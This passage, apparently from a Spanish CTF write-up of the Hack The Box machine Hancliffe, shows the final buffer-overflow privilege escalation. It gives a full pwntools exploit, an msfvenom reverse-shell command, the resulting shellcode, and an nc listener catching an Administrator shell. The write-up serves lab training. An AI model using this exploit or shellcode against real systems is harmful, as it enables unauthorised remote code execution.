+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'add</span>  <span class=mtk4>esp,</span> <span class=mtk4>0x48'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'pop</span>  <span class=mtk4>eax'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'push</span> <span class=mtk4>eax'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'sub</span>  <span class=mtk4>esp,</span> <span class=mtk4>0x48'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'sub</span>  <span class=mtk4>esp,</span> <span class=mtk4>0x64'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'xor</span>  <span class=mtk4>ebx,</span>  <span class=mtk4>ebx'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'push</span> <span class=mtk4>ebx'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'add</span>   <span class=mtk4>bh,</span> <span class=mtk4>0x04'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'push</span> <span class=mtk4>ebx'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'mov</span>  <span class=mtk4>ebx,</span>  <span class=mtk4>esp'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'add</span>  <span class=mtk4>ebx,</span> <span class=mtk4>0x64'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'push</span> <span class=mtk4>ebx'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'push</span> <span class=mtk4>eax'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'mov</span>  <span class=mtk4>eax,</span> <span class=mtk4>dword</span> <span class=mtk4>ptr</span> <span class=mtk4>ds:0x719082ac'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'call</span> <span class=mtk4>eax'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\x90</span><span class=mtk4>'</span> <span class=mtk5>*</span> <span class=mtk1>(</span><span class=mtk1>offset</span> <span class=mtk5>+</span> <span class=mtk8>len</span><span class=mtk1>(</span><span class=mtk1>code</span><span class=mtk1>)</span> <span class=mtk5>-</span> <span class=mtk8>len</span><span class=mtk1>(</span><span class=mtk1>payload</span><span class=mtk1>))</span>  
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>jmp_esp</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>jmp_back</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\x90</span><span class=mtk4>'</span> <span class=mtk5>*</span> <span class=mtk6>8</span>
+
+    <span class=mtk1>r</span> <span class=mtk5>=</span> <span class="mtk8 mtku">remote</span><span class=mtk1>(</span><span class=mtk1>ip</span><span class=mtk1>,</span> <span class=mtk1>port</span><span class=mtk1>)</span>
+
+    <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Username:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class=mtk1>username</span><span class=mtk1>)</span>
+    <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Password:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class=mtk1>password</span><span class=mtk1>)</span>
+    <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'FullName:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class=mtk1>fullname</span><span class=mtk1>)</span>
+    <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Input</span> <span class=mtk4>Your</span> <span class=mtk4>Code:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class=mtk1>payload</span><span class=mtk1>)</span>
+
+    <span class=mtk1>shellcode</span> <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\xcc</span><span class=mtk4>'</span> <span class=mtk5>*</span> <span class=mtk6>400</span>
+
+    <span class=mtk8>sleep</span><span class=mtk1>(</span><span class=mtk6>1</span><span class=mtk1>)</span>
+    <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk8>sendline</span><span class=mtk1>(</span><span class=mtk1>shellcode</span><span class=mtk1>)</span>
+
+
+<span class=mtk5>if</span> <span class=mtk1>__name__</span> <span class=mtk5>==</span> <span class=mtk4>'__main__'</span><span class=mtk1>:</span>
+    <span class=mtk8>main</span><span class=mtk1>()</span>
+</code></pre></div><p><img src=/images/HTB/Hancliffe/Hancliffe-captureG.png alt=EIP></p><p>Ok, se ejecuta el segundo <em>payload</em>. Ahora podemos crear <em>shellcode</em> con <code>msfvenom</code> para conseguir una <em>reverse shell</em> en la máquina víctima:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>msfvenom</span> -p windows/shell_reverse_tcp LHOST=10.10.17.44 LPORT=4444 -f c
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload  
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of c file: 1386 bytes
+unsigned char buf[] =
+"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
+"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
+"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
+"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
+"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
+"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
+"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
+"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
+"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
+"\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
+"\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
+"\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
+"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x0a\x11\x2c\x68"
+"\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
+"\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2"
+"\x56\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
+"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44"
+"\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56"
+"\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff"
+"\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6"
+"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
+"\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5";
+</code></pre></div><p>Y este es el <em>exploit</em> final (<code>exploitH.py</code>):</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk3>#!/usr/bin/env</span> <span class=mtk3>python3</span>
+
+<span class=mtk5>from</span> <span class="mtk8 mtku">pwn</span> <span class=mtk5>import</span> <span class=mtk5>*</span>
+
+
+<span class="mtk7 mtki">def</span> <span class=mtk8>main</span><span class=mtk1>():</span>
+    <span class=mtk1>ip</span><span class=mtk1>,</span> <span class=mtk1>port</span> <span class=mtk5>=</span> <span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>[</span><span class=mtk6>1</span><span class=mtk1>],</span> <span class="mtk8 mtku">int</span><span class=mtk1>(</span><span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>[</span><span class=mtk6>2</span><span class=mtk1>])</span>
+
+    <span class=mtk1>username</span> <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'alfiansyah'</span>
+    <span class=mtk1>password</span> <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'K3r4j@@nM4j@pAh!T'</span>
+    <span class=mtk1>fullname</span> <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'Vickry</span> <span class=mtk4>Alfiansyah'</span>
+    <span class=mtk1>code</span>     <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'T3D83CbJkl1299'</span>
+
+    <span class=mtk1>offset</span>   <span class=mtk5>=</span> <span class=mtk6>52</span>
+    <span class=mtk1>jmp_esp</span>  <span class=mtk5>=</span> <span class=mtk1>p32(</span><span class="mtk7 mtki">0x</span><span class=mtk6>7190239f</span><span class=mtk1>)</span>
+    <span class=mtk1>jmp_back</span> <span class=mtk5>=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'jmp</span> <span class=mtk4>$-56'</span><span class=mtk1>)</span>
+
+    <span class=mtk1>payload</span>  <span class=mtk5>=</span> <span class=mtk1>code</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'add</span>  <span class=mtk4>esp,</span> <span class=mtk4>0x48'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'pop</span>  <span class=mtk4>eax'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'push</span> <span class=mtk4>eax'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'sub</span>  <span class=mtk4>esp,</span> <span class=mtk4>0x48'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'sub</span>  <span class=mtk4>esp,</span> <span class=mtk4>0x64'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'xor</span>  <span class=mtk4>ebx,</span>  <span class=mtk4>ebx'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'push</span> <span class=mtk4>ebx'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'add</span>   <span class=mtk4>bh,</span> <span class=mtk4>0x04'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'push</span> <span class=mtk4>ebx'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'mov</span>  <span class=mtk4>ebx,</span>  <span class=mtk4>esp'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'add</span>  <span class=mtk4>ebx,</span> <span class=mtk4>0x64'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'push</span> <span class=mtk4>ebx'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'push</span> <span class=mtk4>eax'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'mov</span>  <span class=mtk4>eax,</span> <span class=mtk4>ds:0x719082ac'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'call</span> <span class=mtk4>eax'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\x90</span><span class=mtk4>'</span> <span class=mtk5>*</span> <span class=mtk1>(</span><span class=mtk1>offset</span> <span class=mtk5>+</span> <span class=mtk8>len</span><span class=mtk1>(</span><span class=mtk1>code</span><span class=mtk1>)</span> <span class=mtk5>-</span> <span class=mtk8>len</span><span class=mtk1>(</span><span class=mtk1>payload</span><span class=mtk1>))</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>jmp_esp</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>jmp_back</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\x90</span><span class=mtk4>'</span> <span class=mtk5>*</span> <span class=mtk6>8</span>
+
+    <span class=mtk1>r</span> <span class=mtk5>=</span> <span class="mtk8 mtku">remote</span><span class=mtk1>(</span><span class=mtk1>ip</span><span class=mtk1>,</span> <span class=mtk1>port</span><span class=mtk1>)</span>
+
+    <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Username:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class=mtk1>username</span><span class=mtk1>)</span>
+    <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Password:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class=mtk1>password</span><span class=mtk1>)</span>
+    <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'FullName:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class=mtk1>fullname</span><span class=mtk1>)</span>
+    <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Input</span> <span class=mtk4>Your</span> <span class=mtk4>Code:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class=mtk1>payload</span><span class=mtk1>)</span>
+
+    <span class=mtk1>shellcode</span> <span class=mtk5>=</span> <span class=mtk1>(</span>
+        <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x</span><span class=mtk6>8b\x50\x30</span><span class=mtk4>'</span>  
+        <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x</span><span class=mtk6>26\x31\xff</span><span class=mtk4>'</span>
+        <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x</span><span class=mtk6>e2\xf2\x52</span><span class=mtk4>'</span>
+        <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x</span><span class=mtk6>48\x01\xd1</span><span class=mtk4>'</span>
+        <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x</span><span class=mtk6>8b\x34\x8b</span><span class=mtk4>'</span>
+        <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x</span><span class=mtk6>75\xf6\x03</span><span class=mtk4>'</span>
+        <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\x</span><span class=mtk6>d3\x66\x8b</span><span class=mtk4>'</span>
+        <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x</span><span class=mtk6>89\x44\x24</span><span class=mtk4>'</span>
+        <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x</span><span class=mtk6>8b\x12\xeb</span><span class=mtk4>'</span>
+        <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x</span><span class=mtk6>54\x68\x4c</span><span class=mtk4>'</span>
+        <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x</span><span class=mtk6>54\x50\x68</span><span class=mtk4>'</span>
+        <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x</span><span class=mtk6>40\x50\x68</span><span class=mtk4>'</span>
+        <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x0a\x</span><span class=mtk6>11\x2c\x68</span><span class=mtk4>'</span>
+        <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56\x57\x68\x99\x</span><span class=mtk6>a5\x74\x61</span><span class=mtk4>'</span>
+        <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\x</span><span class=mtk6>f0\xb5\xa2</span><span class=mtk4>'</span>
+        <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\x56\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x</span><span class=mtk6>57\x31\xf6</span><span class=mtk4>'</span>
+        <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x</span><span class=mtk6>01\x8d\x44</span><span class=mtk4>'</span>
+        <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x</span><span class=mtk6>4e\x56\x56</span><span class=mtk4>'</span>
+        <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x</span><span class=mtk6>56\x46\xff</span><span class=mtk4>'</span>
+        <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x</span><span class=mtk6>56\x68\xa6</span><span class=mtk4>'</span>
+        <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x</span><span class=mtk6>75\x05\xbb</span><span class=mtk4>'</span>
+        <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5</span><span class=mtk4>'</span>
+    <span class=mtk1>)</span>
+
+    <span class=mtk8>sleep</span><span class=mtk1>(</span><span class=mtk6>1</span><span class=mtk1>)</span>
+    <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk8>sendline</span><span class=mtk1>(</span><span class=mtk1>shellcode</span><span class=mtk1>)</span>
+
+
+<span class=mtk5>if</span> <span class=mtk1>__name__</span> <span class=mtk5>==</span> <span class=mtk4>'__main__'</span><span class=mtk1>:</span>
+    <span class=mtk8>main</span><span class=mtk1>()</span>
+</code></pre></div><p>Si lo lanzamos contra la máquina víctima, conseguimos acceso como <code>Administrator</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> exploitH.py 10.10.11.115 9999
+[<span class=code-green>+</span>] Opening connection to 10.10.11.115 on port 9999: Done  
+[<span class=code-blue>*</span>] Closed connection to 10.10.11.115 port 9999
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>nc</span> -nlvp 4444
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.11.115.
+Ncat: Connection from 10.10.11.115:59614.
+Microsoft Windows [Version 10.0.19043.1266]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+hancliffe\administrator
+
+C:\Windows\system32&gt;type C:\Users\Administrator\Desktop\root.txt  
+e4d75760f0ac306abc83fefd82f85c36
+</code></pre></div><div class="mt6 instapaper_ignoref">
+</div></div><aside aria-label=aside class="w-20-l mt6-l aside-desktop">
+<div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:5rem>
+<p class="f5 b mb3">Contenidos de este write-up</p><nav id=TableOfContents>
+<ul>
+<li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li><li><a href=#enumeración-web>Enumeración web</a></li><li><a href=#acceso-a-la-máquina>Acceso a la máquina</a></li><li><a href=#enumeración-del-sistema>Enumeración del sistema</a></li><li><a href=#movimiento-lateral-al-usuario-clara>Movimiento lateral al usuario <code>clara</code></a></li><li><a href=#movimimento-lateral-al-usuario-development>Movimimento lateral al usuario <code>development</code></a></li><li><a href=#ingeniería-inversa-sobre-el-binario>Ingeniería inversa sobre el binario</a></li><li><a href=#escalada-de-privilegios-explotación-de-_buffer-overflow_>Escalada de privilegios (explotación de <em>Buffer Overflow</em>)</a></li></ul></nav></div></aside></article></main><footer class="bg-black bottom-0 w-100 pa3" role=contentinfo>
+<div class="flex justify-between">
+<a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://7rocky.github.io/ title=https://7rocky.github.io/>&copy; 7Rocky 2022</a>
+<div style=margin-top:8px>
+<div>
+<div>
+<a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</span>
+</a>
+<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
+<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</span>
+</a>
+</div></div></div></div></footer></body></html>
